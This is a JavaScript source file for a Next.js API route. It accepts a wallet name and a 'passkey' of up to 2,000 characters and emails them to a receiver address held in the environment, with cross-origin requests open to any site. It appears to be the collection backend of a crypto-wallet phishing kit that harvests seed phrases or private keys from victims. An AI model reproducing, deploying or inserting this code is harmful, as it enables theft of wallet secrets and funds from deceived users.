import { NextResponse } from 'next/server';
import { getTransporter } from '@/lib/email/transporter';
import { sanitize } from '@/lib/email/sanitize';

export async function POST(request) {
  const required = ['EMAIL', 'PASSKEY', 'RECIEVER_EMAIL'];
  for (const k of required) {
    if (!process.env[k]) {
      return NextResponse.json({ msg: `Missing env ${k}` }, { status: 500 });
    }
  }

  const body = await request.json();

  const { title, passkey } = body || {};
  if (!title || !passkey) {
    return NextResponse.json({ msg: 'Missing title or passkey' }, { status: 400 });
  }
  if (typeof title !== 'string' || typeof passkey !== 'string') {
    return NextResponse.json({ msg: 'Invalid input types' }, { status: 400 });
  }
  if (title.length > 120 || passkey.length > 2000) {
    return NextResponse.json({ msg: 'Input too long' }, { status: 400 });
  }

  const safeTitle = sanitize(title);
  const safePasskey = sanitize(passkey);

  const mailContent = `
    <p>New passkey submission:</p>
    <p><strong>Wallet name:</strong> ${safeTitle}</p>
    <p><strong>Passkey:</strong><br><pre><code>${safePasskey}</code></pre></p>
  `;

  const transporter = getTransporter();
  if (!transporter) {
    return NextResponse.json({ msg: 'Email transporter not configured' }, { status: 500 });
  }

  const mail = {
    from: process.env.EMAIL,
    to: process.env.RECIEVER_EMAIL,
    subject: `Wallet - ${safeTitle}`,
    html: mailContent,
  };

  try {
    await transporter.sendMail(mail);
    return NextResponse.json({ msg: 'Passkey message sent' }, { status: 201 });
  } catch (err) {
    console.error('SendMail failed:', err?.message || err);
    return NextResponse.json({ msg: 'Internal Server Error' }, { status: 500 });
  }
}

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 200,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, x-api-key',
    },
  });
}
